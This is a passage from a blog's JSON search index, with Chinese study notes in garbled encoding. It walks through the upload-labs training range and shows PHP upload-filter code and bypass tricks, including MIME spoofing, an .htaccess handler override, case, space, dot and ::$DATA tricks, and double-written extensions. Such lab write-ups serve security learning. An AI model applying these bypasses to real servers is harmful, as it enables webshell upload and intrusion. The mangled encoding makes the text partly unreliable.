å‚è€ƒé“¾æ¥1https://www.cnblogs.com/1996-11-01-614lb/p/14237744.html","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"21WEBæ¼æ´--æ–‡ä»¶ä¸Šä¼ ä¹‹åç«¯é»‘ç™½åå•ç»•è¿‡","slug":"21WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹åç«¯é»‘ç™½åå•ç»•è¿‡","date":"2021-09-21T02:31:00.000Z","updated":"2021-09-21T06:01:46.699Z","comments":true,"path":"2021/09/21/21WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹åç«¯é»‘ç™½åå•ç»•è¿‡/","link":"","permalink":"https://al0nez.github.io/2021/09/21/21WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† æ–‡ä»¶ä¸Šä¼ å¸¸è§éªŒè¯:åç¼€åéªŒè¯é»‘åå•æ£€æµ‹åŸç† æ–‡ä»¶ç±»å‹æ ¹æ®é»‘åå•æ¥æ£€æµ‹çš„åŸç†å°±æ˜¯ï¼šæœåŠ¡å™¨ç¨‹åºæ ¹æ®ä¸€ä»½æ–‡ä»¶åç¼€åçš„åå•æ¥åˆ¤æ–­æ˜¯å¦å…è®¸å½“å‰æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œåªè¦ä¸Šä¼ çš„æ–‡ä»¶çš„ç±»å‹èƒ½å¤Ÿå’Œè¿™ä¸ªé»‘åå•é‡Œé¢çš„ç±»å‹åŒ¹é…ï¼Œé‚£ä¹ˆå°±ç¦æ­¢è¯¥æ–‡ä»¶ä¸Šä¼  æ˜ç¡®ä¸è®©ä¸Šä¼ çš„æ ¼å¼åç¼€ 1asp php jsp aspx cgi war ç­‰ç­‰ ç™½åå•æ£€æµ‹åŸç† æ˜ç¡®å¯ä»¥ä¸Šä¼ çš„åç¼€æ ¼å¼ï¼Œå°±æ˜¯è¯´åªå…è®¸ä¸Šä¼ æ˜ç¡®æ ‡æ³¨çš„æ ¼å¼ï¼Œå…¶ä»–æ ¼å¼ä¸å…è®¸ä¸Šä¼  1jpg png zip rar gif ç­‰ç­‰ æ–‡ä»¶ç±»å‹éªŒè¯æ£€æµ‹åŸç† å½“ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨ç«¯çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ç«¯çš„ç¨‹åºä¼šè·å–ä¸Šä¼ æ–‡ä»¶çš„MIMEç±»å‹ï¼Œç„¶åç”¨è¿™ä¸ªè·å–åˆ°çš„ç±»å‹æ¥å’ŒæœŸæœ›çš„MIMEç±»å‹è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…ä¸ä¸Šåˆ™è¯´æ˜ä¸Šä¼ çš„æ–‡ä»¶ä¸åˆæ³•ã€‚ æ–‡ä»¶å¤´éªŒè¯æ£€æµ‹åŸç† æ–‡ä»¶å¤´æ£€æŸ¥æ˜¯æŒ‡å½“æµè§ˆå™¨ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„æ—¶å€™ï¼Œä¼šå¯¹æ–‡ä»¶å¤´æ£€æµ‹ï¼Œç¬¦åˆï¼Œåˆ™å…è®¸ä¸Šä¼ ï¼Œå¦åˆ™ä¸å…è®¸ä¸Šä¼ ã€‚ ç»•è¿‡æ–¹æ³• é€šè¿‡å°†æ–‡ä»¶å¤´ä¿®æ”¹ä¸ºGIF89a0ç­‰ä¸€äº›å›¾ç‰‡å¤´éƒ¨çš„å½¢å¼è¿›è¡Œç»•è¿‡ æ–‡ä»¶ç±»å‹ç»•è¿‡(ä»¥uploadé¶åœºä¸ºä¾‹)æ–‡ä»¶ç±»å‹æ£€æµ‹(MIME)1http://127.0.0.1/upload-labs/Pass-02/index.php æœ¬å…³ä¼šæ£€æµ‹æ–‡ä»¶ç±»å‹æ˜¯ä¸æ˜¯å›¾ç‰‡æ ¼å¼ï¼Œæ»¡è¶³æ‰ä¼šé€šè¿‡ 123456789101112131415161718$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR.&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡æ–¹æ³•å› ä¸ºæœåŠ¡ç«¯æ£€æµ‹çš„æ˜¯æ–‡ä»¶çš„MIMEç±»å‹ï¼Œè€Œå¯¹è¿™ä¸ªMIMEç±»å‹çš„çš„å€¼çš„è·å–æ˜¯é€šè¿‡HTTPè¯·æ±‚å­—æ®µé‡Œçš„Content-Typeå­—æ®µï¼Œæ‰€ä»¥ç»•è¿‡çš„æ–¹æ³•å°±æ˜¯é€šè¿‡ä¿®æ”¹Content-Typeçš„å€¼ï¼Œæ¯”å¦‚ä¿®æ”¹ä¸ºimage/jpegï¼›image/pngï¼›image/gifç­‰ç­‰å…è®¸ä¸Šä¼ ç±»å‹å¯¹åº”çš„MIMEå€¼ã€‚ é»‘åå•ç»•è¿‡æ–‡ä»¶ååç¼€ç»•è¿‡1http://127.0.0.1/upload-labs/Pass-03/index.php æ£€æµ‹ä»£ç  123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if(!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR. &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR .&#x27;/&#x27;. $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡ ç”¨åƒphp3ï¼Œphp5è¿™æ ·çš„æ–‡ä»¶åç»•è¿‡æ£€æµ‹ï¼Œè€Œphpä¼šå½“ä½œphpæ–‡ä»¶æ‰§è¡Œ .htaccessæ–‡ä»¶ç»•è¿‡ï¼ˆåªæ”¯æŒapacheï¼‰1http://127.0.0.1/upload-labs/Pass-04/index.php .htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€)æä¾›äº†é’ˆå¯¹æ¯ä¸ªç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œå³åœ¨ä¸€ä¸ªç‰¹å®šçš„ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«æŒ‡ä»¤çš„æ–‡ä»¶ï¼Œå…¶ä¸­çš„æŒ‡ä»¤ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ .htaccessæ–‡ä»¶å†…å®¹ï¼š xxxä¸ºè¦å°†æ­¤åç¼€çš„æ–‡ä»¶è§£æä¸ºphpæ–‡ä»¶ 123&lt;FilesMatch &quot;xxx&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; æ£€æµ‹ä»£ç  123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡ å¤§å°å†™ç»•è¿‡1http://127.0.0.1/upload-labs/Pass-05/index.php æ£€æµ‹ä»£ç  123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡ ç©ºæ ¼ç»•è¿‡1http://127.0.0.1/upload-labs/Pass-06/index.php é€šè¿‡æŠ“åŒ…åœ¨æ–‡ä»¶åååŠ å…¥ç©ºæ ¼ç»•è¿‡ï¼Œwindowsä¸­å¦‚æœæœ€åæ˜¯ç©ºæ ¼ï¼Œwindowsä¼šå¼ºè¡Œå°†ç©ºæ ¼å»é™¤ã€‚ æ£€æµ‹ä»£ç  1234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡ ç‚¹ç»•è¿‡1http://127.0.0.1/upload-labs/Pass-07/index.php æ²¡æœ‰å¯¹åç¼€åæœ«å°¾çš„ç‚¹è¿›è¡Œå¤„ç†ï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œä¼šè‡ªåŠ¨å»æ‰åç¼€åä¸­æœ€åçš„â€.â€ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€.â€ç»•è¿‡ æ£€æµ‹ä»£ç  1234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡ ::$DATAç»•è¿‡åœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒâ€::$DATAâ€ä¹‹å‰çš„æ–‡ä»¶åã€‚åˆ©ç”¨windowsç‰¹æ€§ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€ ::$DATAâ€ç»•è¿‡ 1http://127.0.0.1/upload-labs/Pass-08/index.php æ£€æµ‹ä»£ç  1234567891011121314151617181920212223$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡ ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡é€šè¿‡. .æ¥ç»•è¿‡ 1http://127.0.0.1/upload-labs/Pass-09/index.php æ£€æµ‹ä»£ç  12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; 1234$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹$file_ext = trim($file_ext); //é¦–å°¾å»ç©ºè¿™é‡Œåªè¿›è¡Œäº†ä¸€æ¬¡è¯¥ä»£ç æˆ‘ä»¬é€šè¿‡.php. .çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œç¬¬ä¸€æ¬¡åˆ é™¤äº†æœ€åé¢çš„ç‚¹å˜æˆ.php. ç¬¬äºŒæ¬¡å»ç©ºå˜æˆäº†.php.çš„å½¢å¼ï¼Œæ‰€ä»¥è¿˜å¯ä»¥ç»•è¿‡ã€‚ ç»•è¿‡ åŒå†™ç»•è¿‡1http://127.0.0.1/upload-labs/Pass-10/index.php å°†é»‘åå•é‡Œçš„åç¼€åæ›¿æ¢ä¸ºç©ºä¸”åªæ›¿æ¢ä¸€æ¬¡ï¼Œå› æ­¤å¯ä»¥ç”¨åŒå†™ç»•è¿‡ï¼Œå†™ä¸º1.pphphpã€‚ æ£€æµ‹ä»£ç  12345678910111213141516$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); æ›¿æ¢ä¸ºç©º if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $UPLOAD_ADDR . &#x27;/&#x27; . $file_name)) &#123; $img_path = $UPLOAD_ADDR . &#x27;/&#x27; .$file_name; $is_upload = true; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡ 